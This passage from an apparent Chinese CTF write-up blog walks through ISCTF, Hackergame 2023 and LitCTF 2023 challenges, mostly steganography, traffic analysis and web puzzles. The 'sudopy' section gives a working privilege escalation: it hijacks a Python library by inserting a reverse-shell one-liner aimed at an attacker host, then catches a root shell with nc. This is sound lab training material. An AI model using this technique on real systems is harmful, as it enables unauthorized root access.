</span></span><br><span class="line">data =[<span class="number">1</span>,<span class="number">2.75</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2.5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1.75</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1.5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2.75</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2.5</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1.75</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">1.5</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">1.5</span>,<span class="number">1.5</span>,<span class="number">1</span>,</span><br><span class="line"><span class="number">4</span>,<span class="number">2.75</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2.5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3.5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3.5</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1.75</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">3.5</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2.5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2.75</span>,<span class="number">1</span>,</span><br><span class="line"><span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">5.5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">1.75</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">5.5</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">5.5</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2.5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2.75</span>,<span class="number">1</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">7.5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">2.5</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">2.75</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">1.75</span>,<span class="number">1</span>,</span><br><span class="line"><span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">9.5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">2.75</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">2.5</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">9.5</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">9.5</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">1.75</span>,<span class="number">1</span>,</span><br><span class="line"><span class="number">11.5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">1.75</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">11.5</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">1.5</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">1.75</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">2.25</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">2.5</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">2.75</span>,<span class="number">1</span>,<span class="number">11.5</span>,<span class="number">2.25</span>,<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 将数据分割成 x 和 y 坐标 </span></span><br><span class="line">x = data[::<span class="number">3</span>] </span><br><span class="line">y = data[<span class="number">1</span>::<span class="number">3</span>] </span><br><span class="line"><span class="comment"># 绘制散点图 </span></span><br><span class="line">plt.scatter(x,y) </span><br><span class="line">plt.title(<span class="string">&#x27;Scatter Plot&#x27;</span>) </span><br><span class="line">plt.xlabel(<span class="string">&#x27;X-axis&#x27;</span>) </span><br><span class="line">plt.ylabel(<span class="string">&#x27;Y-axis&#x27;</span>) </span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/TAW8EfrD1cFsn6q.png" alt=""></p><p>拿到密码后解压得到二维码，扫码获得 flag</p><p>非预期解：</p><p>直接爆破 6 位纯数字</p><p><img src="https://s2.loli.net/2024/03/07/xZK3Stws7N5XMRp.png" alt=""></p><blockquote><p>出题人年轻了</p></blockquote><h3 id="张万森，下雪了"><a href="#张万森，下雪了" class="headerlink" title="张万森，下雪了"></a>张万森，下雪了</h3><p>字典爆破，base64 套娃，字频统计，SNOW 隐写</p><p>附件拿到 zip 和字典</p><p><img src="https://s2.loli.net/2024/03/07/bmzOEZS8uXy9iGA.png" alt=""></p><p>字典爆破出密码：blueSHARK666</p><p><img src="https://s2.loli.net/2024/03/07/2bgBrZwiPJ5sKxv.png" alt=""></p><p>结合题目推测 flag.txt 内有 snow 隐写</p><p><img src="https://s2.loli.net/2024/03/07/sfeEJZGxwb8YajS.png" alt=""></p><p>hint.txt 先进行 base64 17 次解密后再进行字频统计得到密码：ISCTFZ023</p><p><img src="https://s2.loli.net/2024/03/07/AbpvR7zmDK2iBF5.png" alt=""></p><p>snow 解密即可</p><p><img src="https://s2.loli.net/2024/03/07/zX8uqfJdRiGSsZM.png" alt=""></p><h3 id="MCSOG-猫猫"><a href="#MCSOG-猫猫" class="headerlink" title="MCSOG-猫猫"></a>MCSOG-猫猫</h3><p>零宽隐写</p><p><img src="https://s2.loli.net/2024/03/07/4rRvZxKAkB2o8pN.png" alt=""></p><p>在群里发送指定消息</p><p><img src="https://s2.loli.net/2024/03/07/2o3sPZKGRXQy7f6.png" alt=""></p><p>复制信息到 vim 中发现有零宽隐写</p><p><img src="https://s2.loli.net/2024/03/07/ZCiBA98aeXTDlHy.png" alt=""></p><p><a href="https://www.mzy0.com/ctftools/zerowidth1/">https://www.mzy0.com/ctftools/zerowidth1/</a></p><p>勾选 200C 202C 200E 即可</p><p><img src="https://s2.loli.net/2024/03/07/C1uFAGI5joTWi42.png" alt=""></p><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><p>  盲注日志分析</p><p><img src="https://s2.loli.net/2024/03/07/nue3lE6wSBqrW4x.png" alt=""></p><p>发现是盲注流量，Tshark 提取一下</p><p>tshark -r xxx.pcapng -Y “http.request” -T fields -e http.request.full_uri &gt; data.txt</p><p>删除一些其他数据并 url 解码后就得到完整的盲注日志了</p><p><img src="https://s2.loli.net/2024/03/07/mwIU5qdKTohs8AY.png" alt=""></p><p><a href="https://www.cnblogs.com/yunqian2017/p/15124198.html">BUU 流量分析 sqltest - 云千 - 博客园</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取输入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化上一行指定位置的数字</span></span><br><span class="line">prev_digit_position = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历每一行数据</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="comment"># 获取当前行指定位置的数字</span></span><br><span class="line">    start_index = line.find(<span class="string">&quot;SELECT flag from answer limit 0,1),&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;SELECT flag from answer limit 0,1),&quot;</span>)</span><br><span class="line">    end_index = line.find(<span class="string">&quot;,1))=&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> start_index != -<span class="number">1</span> <span class="keyword">and</span> end_index != -<span class="number">1</span>:</span><br><span class="line">        digit_position = <span class="built_in">int</span>(line[start_index:end_index])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查指定位置的数字是否发生变化</span></span><br><span class="line">        <span class="keyword">if</span> prev_digit_position + <span class="number">1</span> == digit_position:</span><br><span class="line">            <span class="comment"># 输出当前行的上一行指定位置的数据</span></span><br><span class="line">            prev_line = lines[lines.index(line) - <span class="number">1</span>]</span><br><span class="line">            start_shuju = prev_line.find(<span class="string">&quot;,1))=&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;,1))=&quot;</span>)</span><br><span class="line">            end_shuju = prev_line.find(<span class="string">&quot;--&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(prev_line[start_shuju:end_shuju])),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 更新上一行指定位置的数字</span></span><br><span class="line">        prev_digit_position = digit_position</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/QstlDVAmrOSBfkF.png" alt=""></p><h3 id="PNG-的基本食用"><a href="#PNG-的基本食用" class="headerlink" title="PNG 的基本食用"></a>PNG 的基本食用</h3><p>宽高 lsb binwalk</p><p><strong>图 1 修复宽高</strong></p><p>得到第一段 flag</p><p><img src="https://s2.loli.net/2024/03/07/rtXqp23T7mwlVE9.png" alt=""></p><p>ISCTF{png-is-</p><p><strong>图 2 lsb 最低位</strong></p><p><img src="https://s2.loli.net/2024/03/07/FUxJjnz3SeEgLto.png" alt=""></p><p>so-ez-</p><p><strong>图 3 binwalk 分离出压缩包</strong></p><p><img src="https://s2.loli.net/2024/03/07/WD9hXMOy5LTVUFr.png" alt=""></p><p>解压得到第三段</p><p><img src="https://s2.loli.net/2024/03/07/9YWnZt1T5LVNicC.png" alt=""></p><p>for-you}</p><p><strong>ISCTF{png-is-so-ez-for-you}</strong></p><h3 id="sudopy"><a href="#sudopy" class="headerlink" title="sudopy"></a>sudopy</h3><p>python 库 提权 反弹 shell</p><p><img src="https://s2.loli.net/2024/03/07/rEWsfX5OylNDdpK.png" alt=""></p><p>ssh -p 21269 ctf@43.249.195.138mailto:ctf@43.249.195.138</p><p>password：ctf</p><p>连接题目后，先 pwd 查看当前位置</p><p><img src="https://s2.loli.net/2024/03/07/r3bGt5pJkE8Wso9.png" alt=""></p><p>ls -al 发现 flag 和一个 web.py 文件</p><p><img src="https://s2.loli.net/2024/03/07/c1d5iXHb4Eop89M.png" alt=""></p><p>但是 flag 得 root 才能访问</p><p>sudo -l 显示出自己（执行 sudo 的使用者）的权限</p><p><img src="https://s2.loli.net/2024/03/07/fRv5d3HzZlmp9uS.png" alt=""></p><p>发现/usr/bin/python3 /home/ctf/web.py 这样是可以 sudo 运行不需要密码的</p><p>看下 web.py 的内容</p><p><img src="https://s2.loli.net/2024/03/07/tmWVefdR5ibku6c.png" alt=""></p><p>导入了一个叫 webbrowser 的库</p><p>找下它的位置</p><p><img src="https://s2.loli.net/2024/03/07/4O7FQeEfIJqNi5T.png" alt=""></p><p><a href="https://www.freebuf.com/vuls/279298.html">Linux 权限提升:Python 库劫持 - FreeBuf 网络安全行业门户</a></p><p>根据文章提到的操作，在 webbrowser.py 里放入反弹 shell</p><p>vim /usr/lib/python3.10/webbrowser.py</p><p><strong>反弹shell：import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“攻击机ip”,监听端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/bash”,”-i”]);</strong></p><p><img src="https://s2.loli.net/2024/03/07/iqYIE6DgpjoKuTh.png" alt=""></p><p>保存后退出，同时再开个终端连 vps，连上后 nc -lvnp 端口 开启监听</p><p>然后在靶机处执行命令：sudo /usr/bin/python3 /home/ctf/web.py</p><p><img src="https://s2.loli.net/2024/03/07/nrqDMLHCWu5oh6c.png" alt=""></p><p>成功连接，并且是 root 权限</p><p>接着 cd /home/ctf   后 cat flag 即可</p><p><img src="https://s2.loli.net/2024/03/07/rlt7EzReuFTgvV4.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国科学技术大学第十届信息安全大赛</title>
      <link href="/posts/Hackergame2023.html"/>
      <url>/posts/Hackergame2023.html</url>
      
        <content type="html"><![CDATA[<h2 id="Hackergame-启动"><a href="#Hackergame-启动" class="headerlink" title="Hackergame 启动"></a>Hackergame 启动</h2><p>点一下提交看到 url 处多了参数</p><p>这个是测试你的音频准度的，直接给值 100 就行</p><p><img src="https://s2.loli.net/2024/03/07/pkHvSFQYhUgIT3o.png" alt=""></p><h2 id="更深更暗"><a href="#更深更暗" class="headerlink" title="更深更暗"></a>更深更暗</h2><p>F12 搜索 flag 即可</p><p><img src="https://s2.loli.net/2024/03/07/HJes6wp2D4VTx18.png" alt=""></p><h2 id="赛博井字棋"><a href="#赛博井字棋" class="headerlink" title="赛博井字棋"></a>赛博井字棋</h2><p>题目考查和 ai 下棋，下赢得 flag</p><p>先下一步棋后 bp 抓包</p><p>x=0</p><p><img src="https://s2.loli.net/2024/03/07/jT7P2esWNRCnfu4.png" alt=""></p><p>拿回显给的 session 继续下棋就行了，不用管 ai 下哪</p><p>x=1</p><p><img src="https://s2.loli.net/2024/03/07/c8jWAoCv7EuTyOQ.png" alt=""></p><p>x=2 练成一条线就 win</p><p><img src="https://s2.loli.net/2024/03/07/kA4JQBDgyl9YmMc.png" alt=""></p><h2 id="组委会模拟器"><a href="#组委会模拟器" class="headerlink" title="组委会模拟器"></a>组委会模拟器</h2><p><img src="https://s2.loli.net/2024/03/07/uWF87Tg2yDMs3KU.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> NoSuchElementException</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动浏览器，这里使用Chrome</span></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开网页，替换URL为你的网页地址</span></span><br><span class="line">driver.get(<span class="string">&quot;http://202.38.93.111:10021/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置隐式等待时间为0秒</span></span><br><span class="line">driver.implicitly_wait(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，用于监控新消息并执行点击操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">monitor_and_click_hack</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        message_text = message.find_element(By.TAG_NAME, <span class="string">&quot;span&quot;</span>).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;hack[&quot;</span> <span class="keyword">in</span> message_text.lower():</span><br><span class="line">            message.click()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;处理消息时出错:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在网页上监测新消息并执行点击操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    checked_messages = <span class="built_in">set</span>()</span><br><span class="line">    message_count = <span class="number">0</span></span><br><span class="line">    pause_script = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> pause_script:</span><br><span class="line">                <span class="comment"># 暂停脚本执行100秒</span></span><br><span class="line">                time.sleep(<span class="number">100</span>)</span><br><span class="line">                pause_script = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            wait = WebDriverWait(driver, <span class="number">3</span>)</span><br><span class="line">            messages = wait.until(EC.presence_of_all_elements_located((By.CLASS_NAME, <span class="string">&quot;fakeqq-message__bubble&quot;</span>)))</span><br><span class="line"></span><br><span class="line">            new_messages = [message <span class="keyword">for</span> message <span class="keyword">in</span> messages <span class="keyword">if</span> message <span class="keyword">not</span> <span class="keyword">in</span> checked_messages]</span><br><span class="line">            <span class="keyword">for</span> message <span class="keyword">in</span> new_messages:</span><br><span class="line">                checked_messages.add(message)</span><br><span class="line"></span><br><span class="line">            hack_messages = [message <span class="keyword">for</span> message <span class="keyword">in</span> new_messages <span class="keyword">if</span> <span class="string">&quot;hack[&quot;</span> <span class="keyword">in</span> message.find_element(By.TAG_NAME, <span class="string">&quot;span&quot;</span>).text.lower()]</span><br><span class="line">            <span class="keyword">for</span> message <span class="keyword">in</span> hack_messages:</span><br><span class="line">                monitor_and_click_hack(message)</span><br><span class="line"></span><br><span class="line">            message_count += <span class="built_in">len</span>(hack_messages)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;执行过程中出错:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 等待1.5秒，然后再次检查新消息</span></span><br><span class="line">        time.sleep(<span class="number">1.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>最后弹窗手快截图就行，实在不行就录屏，反正代码我不敢再改了（都是 gpt 弄的，我是废物 QAQ）</p><p>如果没成功就再来几次，这个 sleep 的时间也不是最准的</p><p><img src="https://s2.loli.net/2024/03/07/TQHDmxn9f7d86EO.png" alt=""></p><h2 id="奶奶的睡前-flag-故事"><a href="#奶奶的睡前-flag-故事" class="headerlink" title="奶奶的睡前 flag 故事"></a>奶奶的睡前 flag 故事</h2><p>google 设备截图泄露（同之前的 win11 截图漏洞）</p><p><a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">https://github.com/frankthetank-music/Acropalypse-Multi-Tool</a></p><p><img src="https://s2.loli.net/2024/03/07/vUqjtD4THkS51em.png" alt=""></p><h2 id="虫"><a href="#虫" class="headerlink" title="虫"></a>虫</h2><p>sstv</p><p>音频直接给工具梭哈</p><p><a href="https://www.cnblogs.com/wutou/p/16154582.html">https://www.cnblogs.com/wutou/p/16154582.html</a></p><p><img src="https://s2.loli.net/2024/03/07/uY7MBzSEW5Kq1me.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/xSbkD1CfyGoh8pl.png" alt=""></p><h2 id="Git-Git"><a href="#Git-Git" class="headerlink" title="Git? Git!"></a>Git? Git!</h2><p>git 版本回退</p><p>拿到文件夹（git 的本地库）</p><p>直接在目录下 git log 查看历史版本</p><p><img src="https://s2.loli.net/2024/03/07/PrD5n6gZlxceEbK.png" alt=""></p><p>git reset —hard xxxxxxxxxxxxxxx 回退版本</p><p>但是这里都不是的，实际上在.git 的 logs 里的 HEAD 文件中可以看到</p><p><img src="https://s2.loli.net/2024/03/07/PSusUBDnrXOlIdg.png" alt=""></p><p>这个才是修改内容，一开始 000 是没内容的估计，然后给了内容后变成了 15f</p><p>15f 又更新为 505 的，但这个时候 505 又退成了 15f，也就是说这里就符合题目的情景</p><p><img src="https://s2.loli.net/2024/03/07/Qk4Bd93YyFzW26i.png" alt=""></p><p>所以猜测 505 版本有 flag，git reset —hard 505e1a3f446c23f31807a117e860f57cb5b5bb79</p><p><img src="https://s2.loli.net/2024/03/07/eckGAa8ro3zVZ6i.png" alt=""></p><p>此时再回到最外面的目录，打开 README.md 搜索 flag 即可得到</p><p><img src="https://s2.loli.net/2024/03/07/NDuiqxV8r2WmhBG.png" alt=""></p><h2 id="HTTP-集邮册"><a href="#HTTP-集邮册" class="headerlink" title="HTTP 集邮册"></a>HTTP 集邮册</h2><p>无状态码</p><p><img src="https://s2.loli.net/2024/03/07/wNslhdvQiR3g72E.png" alt=""></p><p>200</p><p><img src="https://s2.loli.net/2024/03/07/TmVsgqd7rB59nO1.png" alt=""></p><p>405</p><p><img src="https://s2.loli.net/2024/03/07/DEdcaoN6q7glFPT.png" alt=""></p><p>404</p><p><img src="https://s2.loli.net/2024/03/07/qTb7I1w6OJ4m9Rs.png" alt=""></p><p>400</p><p><img src="https://s2.loli.net/2024/03/07/QmK7pzFAOn2NDCV.png" alt=""></p><p>505</p><p><img src="https://s2.loli.net/2024/03/07/zbR43pnKXNTtkwj.png" alt=""></p><h2 id="猫咪小测"><a href="#猫咪小测" class="headerlink" title="猫咪小测"></a>猫咪小测</h2><p><img src="https://s2.loli.net/2024/03/07/dnOQR2BgJeFlvWk.png" alt=""></p><p><a href="https://lib.ustc.edu.cn/%E6%9C%AC%E9%A6%86%E6%A6%82%E5%86%B5/%E5%9B%BE%E4%B9%A6%E9%A6%86%E6%A6%82%E5%86%B5%E5%85%B6%E4%BB%96%E6%96%87%E6%A1%A3/%E8%A5%BF%E5%8C%BA%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AE%80%E4%BB%8B/">西区图书馆简介 | 中国科学技术大学图书馆</a> 去官网看到位置</p><p><img src="https://s2.loli.net/2024/03/07/EI5pS6LoONs4jyF.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/JygtbUhjFB6S51C.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/9PQozNRTHLk1bZl.png" alt=""></p><p>搜这个英文</p><p><img src="https://s2.loli.net/2024/03/07/Um35LcdPXHTiZth.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/Sclj6YJCPWZzAUF.png" alt=""></p><p>看到 23</p><p><img src="https://s2.loli.net/2024/03/07/hkGK6x7y32D1AEV.png" alt=""></p><p>直接问 gpt 就可以了</p><p><img src="https://s2.loli.net/2024/03/07/uUxkcPFjbWqMIlQ.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/f95ans7bPoLvlFM.png" alt=""></p><p>蒙就完了</p><p><img src="https://s2.loli.net/2024/03/07/lGUghNqAkmVTpKQ.png" alt=""></p><h2 id="小型大语言模型星球"><a href="#小型大语言模型星球" class="headerlink" title="小型大语言模型星球"></a>小型大语言模型星球</h2><blockquote><p>你需要让这个语言模型分别说出 <code>you are smart</code>，<code>accepted</code>，<code>hackergame</code> 和 <code>🐮</code>，以获得四个 flag</p></blockquote><p><img src="https://s2.loli.net/2024/03/07/od5XsHwMcaPpGU6.png" alt=""></p><p>第一个问 Am I smart？即可</p><h2 id="低带宽星球"><a href="#低带宽星球" class="headerlink" title="低带宽星球"></a>低带宽星球</h2><p>压缩图片并保证像素极</p><p><a href="https://docsmall.com/image-compress">在线图片压缩 - docsmall 在线图片压缩工具,在线图片压缩软件</a></p><p>能压到 1kb 拿到 flag1</p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF 2023</title>
      <link href="/posts/LitCTF2023%5B1%5D.html"/>
      <url>/posts/LitCTF2023%5B1%5D.html</url>
      
        <content type="html"><![CDATA[<p>官方wp：<a href="https://dqgom7v7dl.feishu.cn/docx/VyLmdhKDOou5E8xruA7c8bSInKf">https://dqgom7v7dl.feishu.cn/docx/VyLmdhKDOou5E8xruA7c8bSInKf</a></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="我-Flag-呢？"><a href="#我-Flag-呢？" class="headerlink" title="我 Flag 呢？"></a>我 Flag 呢？</h3><p>查询源代码</p><p><img src="https://s2.loli.net/2024/03/07/b2iuLVK4tFAOrGC.png" alt=""></p><p><strong>NSSCTF{35a119e1-89cf-4133-88d0-61a81d8303f5}</strong></p><h3 id="彩蛋-1："><a href="#彩蛋-1：" class="headerlink" title="彩蛋 1："></a><strong>彩蛋 1：</strong></h3><p><img src="https://s2.loli.net/2024/03/07/bJHSUI8fMvWD5E3.png" alt=""></p><p><strong>LitCTF{First_t0_The_k3y! (1/?)</strong></p><h3 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h3><p><strong>找到game.js，代码过第六关的时候会弹出flag，flag泄露</strong></p><p><img src="https://s2.loli.net/2024/03/07/82dOI7bArWaYjwV.png" alt=""></p><p><strong>flag{y0u<em>w1n_th1s</em>!!!}</strong></p><h3 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h3><p>  get     post   备份文件</p><p><img src="https://s2.loli.net/2024/03/07/B76D5tG4FXRWcem.png" alt=""></p><p><strong>NSSCTF{64b164d6-78e9-4fff-b0a6-51804ca156d7}</strong></p><h3 id="彩蛋-3"><a href="#彩蛋-3" class="headerlink" title="彩蛋 3:"></a>彩蛋 3:</h3><p><img src="https://s2.loli.net/2024/03/07/k5YLineldhPUFSt.png" alt=""></p><p><strong>dirsearch走一波</strong></p><p><img 